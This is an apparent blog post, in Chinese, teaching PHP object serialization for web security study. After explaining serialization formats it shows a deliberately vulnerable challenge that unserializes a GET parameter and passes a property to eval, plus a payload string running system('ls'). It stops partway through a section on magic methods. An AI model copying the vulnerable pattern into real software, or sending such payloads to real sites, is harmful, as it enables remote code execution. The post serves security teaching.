    <id>https://blog.boychai.xyz/2025/06/24/WEB-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/</id>
    <published>2025-06-24T10:47:00.000Z</published>
    <updated>2025-07-17T05:40:18.601Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP中的类"><a href="#PHP中的类" class="headerlink" title="PHP中的类"></a>PHP中的类</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$species</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;woof woof&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面定义了一个Dog类，并且他又两个成员变量，分别是<code>name</code>和<code>species</code>，然后还有一个成员方法<code>call()</code>，可以通过下面代码去创建和使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建对象</span></span><br><span class="line"><span class="variable">$dog1</span> = <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line"><span class="comment"># 给dog1设置name属性</span></span><br><span class="line"><span class="variable">$dog1</span>-&gt;name = <span class="string">&quot;luck&quot;</span>;</span><br><span class="line"><span class="comment"># 调用call方法</span></span><br><span class="line"><span class="variable">$dog1</span>-&gt;<span class="title function_ invoke__">call</span>();</span><br><span class="line"><span class="comment"># 打印对象</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$dog1</span>);</span><br></pre></td></tr></table></figure><p>后续的，成员变量这里存在三种修饰符，用来管理访问权限的，分别是</p><ul><li>public      默认的修饰符，他可以在任何位置使用，不受限制</li><li>protected 需要指定，他只能在类的内部、子类中可以使用，但是不能在类的外部使用</li><li>private     私有的，只能在类的内部使用，在类的外部或者子类中都无法使用<br>具体应用到上面代码中，具体如下</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$color</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$species</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;woof woof&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时我们如果想要去修改他的<code>color</code>和<code>species</code>或者读取的话都是会出问题，使用下面代码去验证</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dog1</span> = <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line"><span class="variable">$dog1</span>-&gt;name = <span class="string">&quot;luck&quot;</span>;</span><br><span class="line"><span class="variable">$dog1</span>-&gt;color = <span class="string">&quot;black&quot;</span>;</span><br><span class="line"><span class="variable">$dog1</span>-&gt;species = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$dog1</span>);</span><br></pre></td></tr></table></figure><p>当运行到修改color的时候，就会直接报错<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250617110356.png"><br>如果想要利用这俩外部不可调用的成员变量，需要在对应的位置添加调用代码，例如下面代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$color</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$species</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;woof woof&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">GeneMutation</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;species = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echoColor</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;color;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echoSpecies</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;species;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Labrador</span> <span class="keyword">extends</span> <span class="title">Dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;color = <span class="string">&quot;golden&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增了一个一个拉布拉多的子类，初始化拉布拉多的时候给他的颜色修改成了<code>golden</code>，然后再Dog类中，增加了三个方法，输出颜色，输出种类还有一个基因突变，基因突变的方法直接修改了他的种类，测试运行代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dog1</span> = <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line"><span class="variable">$dog1</span>-&gt;name = <span class="string">&quot;luck&quot;</span>;</span><br><span class="line"><span class="variable">$dog1</span>-&gt;<span class="title function_ invoke__">GeneMutation</span>();</span><br><span class="line"><span class="variable">$dog1</span>-&gt;<span class="title function_ invoke__">echoColor</span>();</span><br><span class="line"><span class="variable">$dog1</span>-&gt;<span class="title function_ invoke__">echoSpecies</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$dog2</span> = <span class="keyword">new</span> <span class="title class_">Labrador</span>();</span><br><span class="line"><span class="variable">$dog2</span>-&gt;name = <span class="string">&quot;luck2&quot;</span>;</span><br><span class="line"><span class="variable">$dog2</span>-&gt;<span class="title function_ invoke__">init</span>();</span><br><span class="line"><span class="variable">$dog2</span>-&gt;<span class="title function_ invoke__">echoColor</span>();</span><br><span class="line"><span class="variable">$dog2</span>-&gt;<span class="title function_ invoke__">echoSpecies</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印对象</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$dog1</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$dog2</span>);</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">catgoldendogDog <span class="title function_ invoke__">Object</span></span><br><span class="line">(</span><br><span class="line">    [name] =&gt; luck</span><br><span class="line">    [<span class="attr">color</span>:<span class="keyword">protected</span>] =&gt; </span><br><span class="line">    [<span class="attr">species</span>:<span class="attr">Dog</span>:<span class="keyword">private</span>] =&gt; cat</span><br><span class="line">)</span><br><span class="line">Labrador <span class="title function_ invoke__">Object</span></span><br><span class="line">(</span><br><span class="line">    [name] =&gt; luck2</span><br><span class="line">    [<span class="attr">color</span>:<span class="keyword">protected</span>] =&gt; golden</span><br><span class="line">    [<span class="attr">species</span>:<span class="attr">Dog</span>:<span class="keyword">private</span>] =&gt; dog</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>然后修饰符也可以修饰方法，这里不过多的去说，因为这里基本用不到。</p><h1 id="序列化基础"><a href="#序列化基础" class="headerlink" title="序列化基础"></a>序列化基础</h1><p>序列化是把对象的状态信息转换成一个可以存储或者是可以传输的形式的过程。反序列化就是把序列化之后的内容再给恢复成对象。<br>简单序列化案例,代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TEST</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data2</span> = <span class="string">&quot;dazzhuang&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pass</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$number</span> = <span class="number">34</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"><span class="variable">$bool</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$null</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">10</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="number">200</span>);</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TEST</span>(<span class="string">&#x27;uu&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TEST</span>(<span class="string">&#x27;uu&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$test2</span>-&gt;data = &amp;<span class="variable">$test2</span>-&gt;data2;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$number</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$bool</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$null</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test2</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终输出内容如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250617132240.png"><br>对应的关系表格如下</p><table><thead><tr><th>类型</th><th>原始内容</th><th>序列化后</th></tr></thead><tbody><tr><td>整形</td><td>34</td><td>i:34;</td></tr><tr><td>字符串</td><td>user</td><td>s:4:”user”; &#x2F;&#x2F; 4代表的是长度</td></tr><tr><td>布尔</td><td>true</td><td>b:1;</td></tr><tr><td>布尔</td><td>flase</td><td>b:0;</td></tr><tr><td>空</td><td>NULL</td><td>N;</td></tr><tr><td>Array</td><td>array(‘a’ &#x3D;&gt; 10, ‘b’ &#x3D;&gt; 200);</td><td>a:2:{s:1:”a”;i:10;s:1:”b”;i:200;}  &#x2F;&#x2F; a:2 2代表的是数量 a代表的是array</td></tr><tr><td>Array</td><td>array(‘benben’,’dazhuang’,’laoliu’);</td><td>a:3:{i:0;s:6:”benben”;i:1;s:8:”dazhuang”;i:2;s:6:”laoliu”;} &#x2F;&#x2F;内容里面会有编号i:0 i:1 i:2</td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>关于对象的话，下面单独举个例子</td><td></td><td></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>test被序列化后返回的内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pub&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;benben&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>里面只会记录成员变量的内容，不会存在成员方法，因为序列化的这个动作只是为了记录状态的。再继续看一个案例，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>test被反序列化后的内容如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250617133723.png"><br>这里的私有属性<code>private $pub</code>序列化之后变成了<code>xtestxpub</code>，这个xtestx就是用来表示私有属性的，中间的<code>test</code>代表属于test类中，一般这种的数据都会加一层url编码来搞，他的实际内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>test%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>test%<span class="number">00</span>pub%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>benben%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>实际中间的两个NULL就是<code>%00</code>。我们再看一下受保护的<code>protected</code>属性案例，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pub</span> = <span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>输出内容如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250617134727.png"><br>他和私有属性差不多，只是把类名字换成了<code>*</code>。再来一类的嵌套案例，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$ben</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ben=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test2</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>返回内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;ben&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pub&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;benben&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p>嵌套的会直接把对应的类丢进去，这个还是比较好理解。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>下面来一道简单的题目来尝试利用一下这个反序列化的漏洞，例题代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;echo &quot;this is test!!&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$get</span> = <span class="variable">$_GET</span>[<span class="string">&quot;benben&quot;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$get</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="title function_ invoke__">displayVar</span>() ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题目里面有一个test类，然后存在一个可控的参数<code>benben</code>，他最终会被反序列化，并且反序列化之后的对象会去调用<code>displayVar()</code>这个方法。然后再<code>displayVar</code>方法中，里面是直接运行了一个eval，eval的内容是参数a的内容，我们这边只需要可以把a的内容进行控制，就可以实现任意代码执行的目的。构造的payload脚本如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;system(&quot;</span>ls<span class="string">&quot;);&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>结果如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250618100906.png"></p><h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><p>在序列化和反序列化的过程中，默认是不会调用方法的，但是有一部分内置的魔术方法，我一般都称为<code>钩子函数</code>，这部分钩子函数会在某些特定的时刻自动执行，包括序列化和反序列化的时候。还有一些会在特定的情况下自动触发，后面的题目基本都是围绕着这块来进行的，下面依次介绍一下经常用的魔术方法。</p><h2 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h2><p>他是一个构造函数，在<code>new(实例化)</code>对象的时候会自动的去执行的一个方法，并且会把传入的参数也都丢给这个函数来处理，简单举个例子，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Dog <span class="subst">$name</span> is created.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;luck&quot;</span>);</span><br></pre></td></tr></table></figure><p>此时运行代码会产生下面输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dog luck is created.</span><br></pre></td></tr></table></figure><h2 id="destruct"><a href="#destruct" class="headerlink" title="__destruct"></a>__destruct</h2><p>他是析构函数，在对象的所有引用被删除或者当对象被显式销毁时执行的魔术方法。下面是案例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span 